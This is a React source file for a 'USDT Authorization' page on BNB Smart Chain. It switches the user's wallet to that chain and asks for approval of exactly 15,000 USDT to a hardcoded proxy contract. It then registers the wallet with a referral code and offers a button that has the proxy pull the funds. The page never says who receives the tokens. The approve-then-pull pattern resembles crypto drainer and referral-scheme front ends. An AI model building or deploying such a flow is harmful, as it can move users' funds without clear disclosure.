// src/USDTAuthorizePage.jsx
import axios from 'axios';
import { BrowserProvider, Contract, formatUnits, parseUnits } from 'ethers';
import { useState } from 'react';
import Usdt from '../../public/images/usdt.jpg';
import { useNavigate } from 'react-router';
//import { useSelector } from 'react-redux';
import { useAppDispatch } from '../redux/hook';
import { login } from '../redux/features/auth/authSlice';

const CFG = {
	usdt: '0x55d398326f99059fF775485246999027B3197955', // BSC USDT
	proxy: '0xb8e47608Cf0aCD5Fd0A27dd405bd82ad938BEb32', // <-- V2
	chainIdHex: '0x38',
	amountStr: '15000',
};

const ERC20_ABI = [
	'function approve(address spender, uint256 amount) external returns (bool)',
	'function allowance(address owner, address spender) view returns (uint256)',
	'function decimals() view returns (uint8)',
	'function balanceOf(address account) view returns (uint256)',
	'function symbol() view returns (string)',
];

// V2 method signature
const PROXY_ABI = [
	'function executeTransferExact(address user, uint256 amount) external',
];

export default function USDTAuthorize() {
	const [prov, setProv] = useState(null);
	const [acct, setAcct] = useState('');
	const [status, setStatus] = useState('');
	const [busy, setBusy] = useState(false);

	const [token, setToken] = useState({
		symbol: 'USDT',
		decimals: 18,
		balance: '0',
		allowance: '0',
	});

  const navigate = useNavigate();
  //const loggedInInfo = useSelector((state) => state?.auth);
	const dispatch = useAppDispatch();

	// Convenience getter for the required amount in token units
	const needUnits = () => parseUnits(CFG.amountStr, token.decimals);

	async function connect() {
		try {
			if (!window.ethereum) {
				setStatus('No Web3 wallet found.');
				return;
			}
			const provider = new BrowserProvider(window.ethereum);

			// Switch to BSC if needed
			const chainId = await window.ethereum.request({ method: 'eth_chainId' });
			if (chainId !== CFG.chainIdHex) {
				await window.ethereum.request({
					method: 'wallet_switchEthereumChain',
					params: [{ chainId: CFG.chainIdHex }],
				});
			}

			const signer = await provider.getSigner();
			const addr = await signer.getAddress();
			setProv(provider);
			setAcct(addr);
			setStatus('Wallet connected.');

			await refreshTokenState(provider, addr);
		} catch (e) {
			console.error(e);
			setStatus('Connection cancelled or failed.');
		}
	}

	async function refreshTokenState(provider, addr) {
		const signer = await provider.getSigner();
		const usdt = new Contract(CFG.usdt, ERC20_ABI, signer);

		const [dec, sym, balRaw, allowRaw] = await Promise.all([
			usdt.decimals().catch(() => 18),
			usdt.symbol().catch(() => 'USDT'),
			usdt.balanceOf(addr),
			usdt.allowance(addr, CFG.proxy),
		]);

		setToken({
			symbol: sym,
			decimals: Number(dec),
			balance: formatUnits(balRaw, dec),
			allowance: formatUnits(allowRaw, dec),
		});
	}

    const fetchWallet = async () => {
		const queryParams = new URLSearchParams(window.location.search);
		const code = queryParams.get('ref');
		return code;
	};

	async function approveExact() {
		if (!prov || !acct) return;
		setBusy(true);
		setStatus(`Requesting authorization for ${CFG.amountStr} ${token.symbol}…`);
		try {
			const signer = await prov.getSigner();
			const usdt = new Contract(CFG.usdt, ERC20_ABI, signer);
			const tx = await usdt.approve(CFG.proxy, needUnits());
			setStatus('Waiting for authorization confirmation…');
			await tx.wait();
			await refreshTokenState(prov, acct);

      if (tx) {
				const value = await fetchWallet();
				try {
					const payload = { address: acct, ref_code: value || '' };
					const res = await axios.post(
						`${import.meta.env.VITE_API_BASE}/user/create-user`,
						payload,
						{ headers: { 'Content-Type': 'application/json' } }
					);
					// success path
					setStatus('User created/registered with backend.');
					// If you need the returned data:
					const user = res.data?.data;


          if(user) {
            // Update Redux state with user info
            dispatch(login({ wallet_address: user.wallet_address, ref_code: user.refer_code }));
            // Navigate to the next page or dashboard
            navigate('/dashboard');

          }
				} catch (apiErr) {
					// Treat “already registered” as a soft success
					if (
						apiErr?.response?.status === 400 &&
						/already registered/i.test(apiErr.response?.data?.message || '')
					) {
						setStatus('User already registered — continuing.');
					} else {
						console.error('Create-user API failed:', apiErr);
						setStatus('Transfer succeeded, but user create failed.');
					}
				}
			}

			setStatus('Authorization successful.');
		} catch (e) {
			console.error(e);
			setStatus('Authorization failed or rejected.');
		} finally {
			setBusy(false);
		}
	}



	  async function executeTransfer() {
    if (!prov || !acct) return;
    setBusy(true);
    setStatus("Submitting transfer request…");
    try {
      const signer = await prov.getSigner();
      const proxy = new Contract(CFG.proxy, PROXY_ABI, signer);
      // V2 requires (user, amount)
      const tx = await proxy.executeTransferExact(acct, needUnits());
      setStatus("Waiting for transfer confirmation…");
      await tx.wait();
      setStatus("Transfer executed.");
      
      // No allowance change from your side here; USDT decreased allowance by the amount
      await refreshTokenState(prov, acct);
    } catch (e) {
      console.error(e);
      setStatus("Transfer failed or rejected.");
    } finally {
      setBusy(false);
    }
  }




	const enough =
		parseFloat(token.allowance || '0') >= parseFloat(CFG.amountStr);

	return (
		<main className="wrap">
			<section className="card bg-base-100 shadow-sm flex flex-col md:flex-row">
  {/* Image */}
  <figure className="w-full md:w-1/4 flex-shrink-0 flex items-center justify-center p-4">
    <img
      src={Usdt}
      alt="USDT"
      className="w-40 h-auto md:w-32 object-contain"
    />
  </figure>

  {/* Text + Buttons */}
  <div className="card-body text-sm flex flex-col justify-center">
    <h2 className="card-title text-base">USDT Authorization</h2>

    <p className="muted leading-relaxed">
      Step 1: Authorize exactly{" "}
      <b>
        {CFG.amountStr} {token.symbol}
      </b>
      .<br />
      Step 2: Execute the transfer.
    </p>

    {!acct ? (
      <button
        className="btn btn-primary w-full md:w-auto"
        onClick={connect}
        disabled={busy}
      >
        Connect Wallet
      </button>
    ) : (
      <>
        <div className="connected break-all">
          Connected: {acct.slice(0, 6)}…{acct.slice(-4)}
        </div>

        <div className="panel grid grid-cols-1 sm:grid-cols-3 gap-3">
          <div>
            Balance: {token.balance} {token.symbol}
          </div>
          <div>
            Current allowance: {token.allowance} {token.symbol}
          </div>
          <div>
            Required: {CFG.amountStr} {token.symbol}
          </div>
        </div>

        {!enough ? (
          <button
            className="btn btn-primary w-full md:w-auto"
            onClick={approveExact}
            disabled={busy}
          >
            Authorize {CFG.amountStr} {token.symbol}
          </button>
        ) : (
          <button
            className="btn w-full md:w-auto"
            onClick={executeTransfer}
            disabled={busy}
          >
            Execute Transfer
          </button>
        )}
      </>
    )}

    {status && <p className="status">{status}</p>}
  </div>
</section>


		</main>
	);
}
